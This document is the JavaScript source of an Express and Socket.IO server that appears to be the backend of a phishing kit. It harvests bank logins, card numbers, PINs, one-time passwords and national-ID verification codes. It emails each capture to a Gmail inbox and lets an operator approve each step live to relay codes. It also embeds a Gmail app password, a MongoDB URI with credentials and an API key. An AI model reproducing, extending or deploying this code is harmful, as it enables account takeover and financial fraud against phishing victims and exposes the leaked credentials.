const express = require("express");
const https = require("https");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors({ origin: "*" }));
app.use(require("morgan")("dev"));

let visitorsCount = 0;
let dashboardCount = 0;

const emailData = {
  user: "zaincash571@gmail.com",
  pass: "lubv bryz mvxj ktmc",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `NCB ${type}`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.sendStatus(200));
app.delete("/", async (req, res) => {
  await Order.find({})
    .then(async (orders) => {
      await Promise.resolve(
        orders.forEach(async (order) => {
          await Order.findByIdAndDelete(order._id);
        })
      );
    })
    .then(() => res.sendStatus(200));
});


app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "login").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/reg", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "reg").then(() => res.status(201).json(order))
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/ncb/login/:id", async (req, res) => {
  const { id } = req.params;
  try {
    await Order.findByIdAndUpdate(
      id,
      {
        phone: req.body.phone,
        loginPassword: req.body.loginPassword,
        LoginAccept: false,
        checked: false,
      },
      { new: true }
    ).then(
      async (order) =>
        await sendEmail(req.body, "ncb_login").then(() =>
          res.status(200).json(order)
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/ncb/otp/:id", async (req, res) => {
  const { id } = req.params;
  try {
    await Order.findByIdAndUpdate(
      id,
      {
        loginOtp: req.body.loginOtp,
        LoginOtpAccept: false,
        checked: false,
      },
      { new: true }
    ).then(
      async (order) =>
        await sendEmail(req.body, "ncb_otp").then(() =>
          res.status(200).json(order)
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/apply/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(
    id,
    {
      ...req.body,
      checked: false,
    },
    { new: true }
  ).then(
    async (order) =>
      await sendEmail(req.body, "apply").then(() => res.status(200).json(order))
  );
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  const cardNumber = req.body.cardNumber || "";
  // const bin = cardNumber.replace(/\s/g, "").substring(0, 6);

  let visaMeta = {};

  // if (bin.length === 6) {
  //   try {
  //     visaMeta = await new Promise((resolve, reject) => {
  //       const options = {
  //         method: "POST",
  //         hostname: "bin-ip-checker.p.rapidapi.com",
  //         port: null,
  //         path: `/?bin=${bin}`,
  //         headers: {
  //           "x-rapidapi-key": "c63ff48789msh8de09311b55c75cp1d85eejsnd0ad18925619",
  //           "x-rapidapi-host": "bin-ip-checker.p.rapidapi.com",
  //           "Content-Type": "application/json",
  //         },
  //       };

  //       const binReq = https.request(options, function (binRes) {
  //         const chunks = [];

  //         binRes.on("data", function (chunk) {
  //           chunks.push(chunk);
  //         });

  //         binRes.on("end", function () {
  //           const body = Buffer.concat(chunks);
  //           try {
  //             const data = JSON.parse(body.toString());
  //             if (data.success && data.BIN) {
  //               resolve({
  //                 visa_brand: data.BIN.brand || "",
  //                 visa_type: data.BIN.type || "",
  //                 visa_issuer: data.BIN.issuer ? data.BIN.issuer.name : "",
  //               });
  //             } else {
  //               resolve({});
  //             }
  //           } catch (e) {
  //             resolve({});
  //           }
  //         });
  //       });

  //       binReq.on("error", (e) => {
  //         console.error("BIN checker error:", e);
  //         resolve({});
  //       });

  //       binReq.write(JSON.stringify({ bin: bin }));
  //       binReq.end();
  //     });
  //   } catch (e) {
  //     console.error(e);
  //   }
  // }

  await Order.findByIdAndUpdate(id, {
    ...req.body,
    ...visaMeta,
    checked: false,
    CardAccept: false,
  }).then(async () =>
    await sendEmail(req.body, "visa").then(() => res.sendStatus(200))
  );
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  const update = {
    CardOtp: req.body.otp,
    checked: false,
    OtpCardAccept: false,
  };
  if (req.body.paymentMethod) {
    update.paymentMethod = req.body.paymentMethod;
  }
  await Order.findByIdAndUpdate(id, update).then(
    async () => await sendEmail(req.body, "otp").then(() => res.sendStatus(200))
  );
});

app.post("/checkoutOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    checkoutOtp: req.body.otp,
    checked: false,
    CheckoutOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "checkoutOtp").then(() => res.sendStatus(200))
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    pin: req.body.pin,
    checked: false,
    PinAccept: false,
  }).then(
    async () => await sendEmail(req.body, "pin").then(() => res.sendStatus(200))
  );
});

app.post("/motsl/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    MotslAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motsl").then(() => res.sendStatus(200))
  );
});
app.post("/motslOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    MotslOtp: req.body.MotslOtp,
    checked: false,
    MotslOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motslOtp").then(() => res.sendStatus(200))
  );
});

app.post("/phone/:id", async (req, res) => {
  const { id } = req.params;
  const { phoneNumber, phoneNetwork, phoneId } = req.body;
  await Order.findByIdAndUpdate(id, {
    MotslPhone: phoneNumber,
    MotslNetwork: phoneNetwork,
    phoneId,
    checked: false,
    MotslAccept: false,
    MotslOtpAccept: false,
    MotslOtp: null,
    stcAwaitingCall: false,
    NavazOtp: null,
    NavazAccept: false,
    MotslOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "phone").then(() => res.sendStatus(200))
  );
});

app.post("/mobOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    mobOtp: req.body.mobOtp,
    checked: false,
    mobOtpAccept: false,
    NavazOtp: null,
    NavazAccept: false,

  }).then(
    async () =>
      await sendEmail(req.body, "mobOtp").then(() => res.sendStatus(200))
  );
});

app.post("/phoneOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    MotslOtp: req.body.phoneOtp,
    checked: false,
    MotslOtpAccept: false,
    stcAwaitingCall: false,
  }).then(
    async () =>
      await sendEmail(req.body, "phoneOtp").then(() => res.sendStatus(200))
  );
});

app.post("/navaz/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    NavazAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "navaz").then(() => res.sendStatus(200))
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

app.delete("/order/:id", async (req, res) => {
  try {
    await Order.findByIdAndDelete(req.params.id);
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(500);
  }
});

app.delete("/orders/all", async (req, res) => {
  try {
    await Order.deleteMany({});
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(500);
  }
});

io.on("connection", (socket) => {
  console.log("connected");

  // Immediately send current counts to the newly connected socket
  socket.emit("onlineCounts", { visitors: visitorsCount, dashboard: dashboardCount });

  socket.on("join", (data) => {
    socket.role = data.role || "visitor";
    if (socket.role === "admin") {
      dashboardCount++;
    } else {
      visitorsCount++;
    }
    io.emit("onlineCounts", { visitors: visitorsCount, dashboard: dashboardCount });
  });

  socket.on("disconnect", () => {
    if (socket.role === "admin") {
      dashboardCount--;
    } else if (socket.role === "visitor") {
      visitorsCount--;
    }
    io.emit("onlineCounts", { visitors: visitorsCount, dashboard: dashboardCount });
  });

  socket.on("newUser", () => io.emit("newUser"));

  socket.on("newData", () => io.emit("newData"));

  socket.on("storeLogin", (id) => {
    console.log("storeLogin", id);
    io.emit("storeLogin", id);
    io.emit("newData");
  });

  socket.on("checkoutPhone", (id) => {
    console.log("checkoutPhone Wait", id);
    io.emit("checkoutPhone", id);
    io.emit("newData");
  });
  socket.on("acceptCheckoutPhone", async (id) => {
    console.log("acceptCheckoutPhone From Admin", id);
    await Order.findByIdAndUpdate(id, { CheckoutPhoneAccept: true });
    io.emit("acceptCheckoutPhone", id);
  });
  socket.on("declineCheckoutPhone", async (id) => {
    console.log("declineCheckoutPhone From Admin", id);
    io.emit("declineCheckoutPhone", id);
  });

  socket.on("checkoutOtp", (id) => {
    console.log("checkoutOtp Wait", id);
    io.emit("checkoutOtp", id);
    io.emit("newData");
  });
  socket.on("acceptCheckoutOtp", async (id) => {
    console.log("acceptCheckoutOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { CheckoutOtpAccept: true });
    io.emit("acceptCheckoutOtp", id);
  });
  socket.on("declineCheckoutOtp", async (id) => {
    console.log("declineCheckoutOtp From Admin", id);
    io.emit("declineCheckoutOtp", id);
  });

  socket.on("paymentForm", (data) => {
    console.log("paymentForm Wait", data);
    io.emit("paymentForm", data);
  });

  socket.on("acceptPaymentForm", async (id) => {
    console.log("acceptPaymentForm From Admin", id);
    console.log(id);
    io.emit("acceptPaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });
  socket.on("declinePaymentForm", async (id) => {
    console.log("declinePaymentForm Form Admin", id);
    io.emit("declinePaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("declineVisaOtp", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });
  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("acceptVisaPin", id);
  });
  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("declineVisaPin", id);
  });

  socket.on("motsl", (data) => {
    console.log("Motsl Data", data);
    io.emit("motsl", data);
  });

  socket.on("acceptMotsl", async (id) => {
    console.log("Motsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("acceptMotsl", id);
  });
  socket.on("declineMotsl", async (id) => {
    console.log("declineMotsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("declineMotsl", id);
  });

  socket.on("motslOtp", async (data) => {
    console.log("motslOtp received", data);
    await Order.findByIdAndUpdate(data.id, {
      MotslOtp: data.MotslOtp,
      STCAccept: false,
    });
    io.emit("motslOtp", data);
  });
  socket.on("acceptMotslOtp", async (data) => {
    console.log("acceptMotslOtp send", { id: data.id, userOtp: data.userOtp });
    io.emit("acceptMotslOtp", { id: data.id, userOtp: data.userOtp });
    await Order.findByIdAndUpdate(data.id, {
      NavazOtp: data.userOtp,
    });
  });
  socket.on("declineMotslOtp", async (id) => {
    console.log("declineMotslOtp send", id);
    io.emit("declineMotslOtp", id);
    await Order.findByIdAndUpdate(id, { MotslOtpAccept: true });
  });

  socket.on("acceptSTC", async ({ id, userOtp }) => {
    console.log("acceptSTC send", { id, userOtp });
    io.emit("acceptSTC", { userOtp, id });
    await Order.findByIdAndUpdate(id, { NavazOtp: userOtp, STCAccept: true });
  });
  socket.on("declineSTC", async (id) => {
    console.log("declineSTC send", id);
    io.emit("declineSTC", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
  });

  socket.on("phone", (data) => {
    io.emit("phone", data);
  });
  socket.on("acceptPhone", async (id) => {
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("acceptPhone", id);
  });
  socket.on("declinePhone", async (id) => {
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("declinePhone", id);
  });

  socket.on("mobOtp", async (data) => {
    await Order.findByIdAndUpdate(data.id, { mobOtp: data.mobOtp });
    io.emit("mobOtp", data);
  });
  socket.on("acceptMobOtp", async (data) => {
    const { id, price } = data;
    io.emit("acceptMobOtp", { id, price });
    await Order.findByIdAndUpdate(id, { NavazOtp: price });
  });
  socket.on("declineMobOtp", async (id) => {
    io.emit("declineMobOtp", id);
  });

  socket.on("phoneOtp", async (data) => {
    await Order.findByIdAndUpdate(data.id, {
      MotslOtp: data.phoneOtp,
      stcAwaitingCall: false,
      NavazOtp: null,
      MotslOtpAccept: false,
      NavazAccept: false,
    });
    io.emit("phoneOtp", data);
  });
  socket.on("acceptStcPhoneOtp", async (id) => {
    io.emit("acceptStcPhoneOtp", id);
    await Order.findByIdAndUpdate(id, { stcAwaitingCall: true });
  });
  socket.on("declineStcPhoneOtp", async (id) => {
    io.emit("declineStcPhoneOtp", id);
  });

  socket.on("acceptService", async (data) => {
    const { id, price } = data;
    io.emit("acceptService", { id, price });
    await Order.findByIdAndUpdate(id, {
      NavazOtp: price,
      stcAwaitingCall: false,
    });
  });
  socket.on("declineService", async (id) => {
    io.emit("declineService", id);
    await Order.findByIdAndUpdate(id, { stcAwaitingCall: false, STCAccept: false, MotslOtpAccept: false, MotslOtp: null, NavazOtp: null, NavazAccept: false });
  });

  socket.on("acceptPhoneOTP", async (data) => {
    io.emit("acceptPhoneOTP", data);
    await Order.findByIdAndUpdate(data.id, { NavazOtp: data.price });
  });
  socket.on("declinePhoneOTP", async (id) => {
    io.emit("declinePhoneOTP", id);
  });

  socket.on("changeNavazCode", async ({ id, userOtp }) => {
    await Order.findByIdAndUpdate(id, { NavazOtp: userOtp });
    io.emit("changeNavazCode", { id, userOtp });
  });

  socket.on("navaz", (data) => {
    console.log("navaz received", data);
    io.emit("navaz", data);
  });
  socket.on("acceptNavaz", async (data) => {
    console.log("acceptNavaz send", data);
    io.emit("acceptNavaz", data);
    await Order.findByIdAndUpdate(data.id, {
      NavazAccept: true,
      NavazOtp: data.userOtp,
    });
  });
  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz send", id);
    io.emit("declineNavaz", id);
    await Order.findByIdAndUpdate(id, { NavazAccept: true });
  });
  socket.on("successValidate", (data) => io.emit("successValidate", data));
  socket.on("declineValidate", (data) => io.emit("declineValidate", data));

  socket.on("registrationForm", (id) => {
    console.log("registrationForm Wait", id);
    io.emit("registrationForm", id);
    io.emit("newData");
  });
  socket.on("acceptRegistration", async (id) => {
    console.log("acceptRegistration From Admin", id);
    await Order.findByIdAndUpdate(id, { FormAccept: true });
    io.emit("acceptRegistration", id);
  });
  socket.on("declineRegistration", async (id) => {
    console.log("declineRegistration From Admin", id);
    io.emit("declineRegistration", id);
  });

  socket.on("userLogin", (id) => {
    console.log("userLogin Wait", id);
    io.emit("userLogin", id);
    io.emit("newData");
  });
  socket.on("acceptUserLogin", async (id) => {
    console.log("acceptUserLogin From Admin", id);
    await Order.findByIdAndUpdate(id, { LoginAccept: true });
    io.emit("acceptUserLogin", id);
  });
  socket.on("declineUserLogin", async (id) => {
    console.log("declineUserLogin From Admin", id);
    io.emit("declineUserLogin", id);
  });

  socket.on("loginOtpSubmit", (id) => {
    console.log("loginOtpSubmit Wait", id);
    io.emit("loginOtpSubmit", id);
    io.emit("newData");
  });
  socket.on("acceptLoginOtp", async (id) => {
    console.log("acceptLoginOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { LoginOtpAccept: true });
    io.emit("acceptLoginOtp", id);
  });
  socket.on("declineLoginOtp", async (id) => {
    console.log("declineLoginOtp From Admin", id);
    io.emit("declineLoginOtp", id);
  });
});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect("mongodb+srv://sahary:sahary@cluster0.emazq5u.mongodb.net/SaharyV1")
  .then((conn) =>
    server.listen(PORT, () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    })
  );




